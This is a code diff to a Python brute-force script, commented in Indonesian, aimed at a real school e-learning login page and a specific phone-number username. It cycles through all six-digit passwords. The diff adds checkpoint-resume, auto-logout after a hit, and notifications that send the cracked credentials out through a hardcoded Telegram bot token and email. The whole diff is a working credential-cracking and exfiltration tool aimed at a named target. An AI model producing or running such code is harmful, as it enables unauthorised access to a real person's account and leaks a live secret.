@@ -16,21 +16,30 @@ class BruteForceLogin:
     def __init__(self):
         # Target website configuration
         self.login_url = "https://agendasekolah.id/pass.asp"
+        self.logout_url = "https://agendasekolah.id/logout.asp"  # URL untuk logout otomatis
         self.success_indicator = "e_learning_siswa.asp"
         self.failure_indicator = "pass_user.asp"
         
         # Username yang akan digunakan (sesuaikan dengan target testing Anda)
-        self.username = "+081288747986"  # GANTI INI DENGAN USERNAME TARGET ANDA!
+        self.username = "081288747986"  # GANTI INI DENGAN USERNAME TARGET ANDA!
+        
+        # Checkpoint configuration - save progress setiap X attempts
+        self.checkpoint_interval = 50  # Save checkpoint setiap 50 attempts
+        self.checkpoint_file = "bruteforce_checkpoint.json"
         
         # Statistics
         self.attempts = 0
         self.start_time = time.time()
+        self.current_password_index = 0  # Track posisi current dalam password range
         
         # Session untuk maintain cookies
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
+        
+        # Load checkpoint jika ada untuk resume execution
+        self.load_checkpoint()
         
         # Notification Settings (opsional - kosongkan jika tidak mau pakai)
         self.telegram_bot_token = "8417649107:AAFc7HeQv2sPr1WSXlnCJFvT00QBPygQ4h4"  # Bot token dari BotFather
@@ -41,9 +50,147 @@ class BruteForceLogin:
         self.email_password = ""      # App password email
         self.email_receiver = ""      # Email penerima
     
+    def save_checkpoint(self):
+        """Save current progress ke file untuk resume capability"""
+        import json
+        checkpoint_data = {
+            'current_password_index': self.current_password_index,
+            'attempts': self.attempts,
+            'start_time': self.start_time,
+            'timestamp': time.time(),
+            'username': self.username
+        }
+        
+        try:
+            with open(self.checkpoint_file, 'w') as f:
+                json.dump(checkpoint_data, f, indent=2)
+            print(f"✅ Checkpoint saved: Password index {self.current_password_index}, Attempts: {self.attempts}")
+        except Exception as e:
+            print(f"⚠️  Failed to save checkpoint: {e}")
+    
+    def load_checkpoint(self):
+        """Load checkpoint dari file jika ada untuk resume execution"""
+        import json
+        import os
+        
+        if not os.path.exists(self.checkpoint_file):
+            print("🚀 Starting fresh brute force (no checkpoint found)")
+            return
+        
+        try:
+            with open(self.checkpoint_file, 'r') as f:
+                checkpoint_data = json.load(f)
+            
+            self.current_password_index = checkpoint_data.get('current_password_index', 0)
+            self.attempts = checkpoint_data.get('attempts', 0)
+            self.start_time = checkpoint_data.get('start_time', time.time())
+            
+            print("🔄 Resuming from checkpoint:")
+            print(f"   Starting from password index: {self.current_password_index}")
+            print(f"   Previous attempts: {self.attempts}")
+            print(f"   Time elapsed from original start: {time.time() - self.start_time:.0f} seconds")
+            
+        except Exception as e:
+            print(f"⚠️  Failed to load checkpoint: {e}")
+            print("🚀 Starting fresh brute force")
+            self.current_password_index = 0
+            self.attempts = 0
+    
+    def logout_from_website(self):
+        """Logout dari website setelah berhasil login untuk membebaskan session"""
+        try:
+            # Coba logout dengan GET request ke logout endpoint
+            logout_response = self.session.get(self.logout_url, timeout=10)
+            
+            # Verifikasi logout berhasil dengan cek apakah redirect ke login page
+            if "login.asp" in logout_response.url.lower() or "login" in logout_response.text.lower():
+                print("✅ Successfully logged out from website")
+                return True
+            else:
+                print("⚠️  Logout attempt made, but verification unclear")
+                return False
+                
+        except Exception as e:
+            print(f"⚠️  Logout attempt failed: {e}")
+            return False
+    
+    def send_telegram_notification(self, message):
+        """Kirim notifikasi ke Telegram"""
+        if not self.telegram_bot_token or not self.telegram_chat_id:
+            return False
+            
+        try:
+            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
+            data = {
+                'chat_id': self.telegram_chat_id,
+                'text': message,
+                'parse_mode': 'HTML'
+            }
+            response = requests.post(url, data=data, timeout=10)
+            return response.status_code == 200
+        except Exception as e:
+            print(f"Telegram notification failed: {e}")
+            return False
+    
+    def send_email_notification(self, subject, message):
+        """Kirim notifikasi ke Email"""
+        if not self.email_sender or not self.email_password or not self.email_receiver:
+            return False
+            
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = self.email_sender
+            msg['To'] = self.email_receiver
+            msg['Subject'] = subject
+            
+            msg.attach(MIMEText(message, 'plain'))
+            
+            server = smtplib.SMTP(self.email_smtp_server, self.email_smtp_port)
+            server.starttls()
+            server.login(self.email_sender, self.email_password)
+            text = msg.as_string()
+            server.sendmail(self.email_sender, self.email_receiver, text)
+            server.quit()
+            return True
+        except Exception as e:
+            print(f"Email notification failed: {e}")
+            return False
+    
+    def send_success_notifications(self, username, password, attempts, time_taken):
+        """Kirim semua notifikasi sukses"""
+        success_message = f"""
+🎉 BRUTE FORCE SUCCESS! 🎉
+
+Target: agendasekolah.id
+Username: {username}
+Password: {password}
+Total Attempts: {attempts}
+Time Taken: {time_taken:.0f} seconds
+
+Script completed successfully!
+        """
+        
+        print("Sending notifications...")
+        
+        # Telegram notification
+        if self.send_telegram_notification(success_message):
+            print("✅ Telegram notification sent!")
+        
+        # Email notification
+        if self.send_email_notification("Brute Force Success!", success_message):
+            print("✅ Email notification sent!")
+        
+        if not self.telegram_bot_token and not self.email_sender:
+            print("ℹ️  No notification methods configured")
+    
     def generate_passwords(self):
-        """Generate password 6 digit dari 000000 sampai 999999"""
-        for i in range(1000000):
+        """Generate password 6 digit mulai dari checkpoint terakhir"""
+        # Start from checkpoint position, bukan dari 0
+        start_index = self.current_password_index
+        
+        for i in range(start_index, 1000000):
+            # Update current position untuk checkpoint
+            self.current_password_index = i
             yield f"{i:06d}"
     
     def attempt_login(self, username, password):
@@ -84,7 +231,7 @@ class BruteForceLogin:
             return f'error: {str(e)}'
     
     def log_attempt(self, username, password, result, elapsed_time):
-        """Log setiap attempt ke console dan file"""
+        """Log setiap attempt ke console dan file, dengan checkpoint periodic"""
         self.attempts += 1
         current_time = time.time()
         total_elapsed = current_time - self.start_time
@@ -96,10 +243,20 @@ class BruteForceLogin:
         with open('bruteforce.log', 'a') as f:
             f.write(log_entry + '\n')
         
+        # Save checkpoint setiap X attempts untuk recovery capability
+        if self.attempts % self.checkpoint_interval == 0:
+            self.save_checkpoint()
+        
         # Progress info setiap 100 attempts
         if self.attempts % 100 == 0:
-            rate = self.attempts / total_elapsed
-            print(f"Progress: {self.attempts} attempts, {rate:.2f} attempts/sec")
+            rate = self.attempts / total_elapsed if total_elapsed > 0 else 0
+            remaining_passwords = 1000000 - self.current_password_index
+            estimated_time = remaining_passwords / rate if rate > 0 else 0
+            
+            print(f"📊 Progress: {self.attempts} attempts, {rate:.2f} attempts/sec")
+            print(f"🔢 Current position: {self.current_password_index}/1000000 ({self.current_password_index/10000:.1f}%)")
+            print(f"⏰ Estimated time remaining: {estimated_time/3600:.1f} hours")
+            print("-" * 60)
     
     def run_bruteforce(self):
         """Main brute force loop"""
@@ -126,19 +283,41 @@ class BruteForceLogin:
                 self.log_attempt(self.username, password, result, attempt_time)
                 
                 if result == 'success':
+                    time_taken = time.time() - self.start_time
                     print("\n" + "="*60)
                     print("🎉 PASSWORD FOUND! 🎉")
                     print(f"Username: {self.username}")
                     print(f"Password: {password}")
                     print(f"Total Attempts: {self.attempts}")
-                    print(f"Time Taken: {time.time() - self.start_time:.0f} seconds")
+                    print(f"Time Taken: {time_taken:.0f} seconds")
                     print("="*60)
                     
                     # Log success ke file
                     with open('bruteforce.log', 'a') as f:
                         f.write(f"\nSUCCESS! Password found: {password}\n")
                         f.write(f"Total attempts: {self.attempts}\n")
-                        f.write(f"Time taken: {time.time() - self.start_time:.0f} seconds\n")
+                        f.write(f"Time taken: {time_taken:.0f} seconds\n")
+                    
+                    # PENTING: Logout otomatis setelah berhasil login
+                    print("🚪 Attempting to logout from website...")
+                    logout_success = self.logout_from_website()
+                    
+                    if logout_success:
+                        print("✅ Session cleared, website available for normal use")
+                    else:
+                        print("⚠️  Please manually logout from website if needed")
+                    
+                    # Hapus checkpoint file karena sudah selesai
+                    try:
+                        import os
+                        if os.path.exists(self.checkpoint_file):
+                            os.remove(self.checkpoint_file)
+                        print("🗑️  Checkpoint file cleaned up")
+                    except Exception as e:
+                        print(f"⚠️  Could not remove checkpoint file: {e}")
+                    
+                    # Kirim notifikasi
+                    self.send_success_notifications(self.username, password, self.attempts, time_taken)
                     
                     return password
                 
